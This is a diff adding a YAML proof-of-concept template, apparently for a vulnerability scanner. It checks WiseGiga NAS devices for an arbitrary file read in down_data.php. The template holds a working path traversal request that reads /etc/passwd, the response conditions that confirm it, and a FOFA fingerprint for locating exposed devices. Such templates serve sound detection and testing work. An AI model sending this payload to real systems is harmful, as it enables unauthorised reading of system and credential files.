@@ -1,0 +1,22 @@
+id: poc-yaml-wisegiga-nas-down-data-php-any-file-read
+info:
+  name: WiseGiga NAS down_data.php 任意文件下载漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: WiseGiga NAS
+  fofa: app="WISEGIGA-NAS"
+requests:
+- method: GET
+  path: /down_data.php?filename=../../../../../../../../../../../../../../etc/passwd
+  expression: 'status_code == 200
+
+    && contains(body,"/bin")
+
+    && contains(body,"root:")
+
+    && !contains(body,"<")
+
+    '
+variables: {}
+transport: http
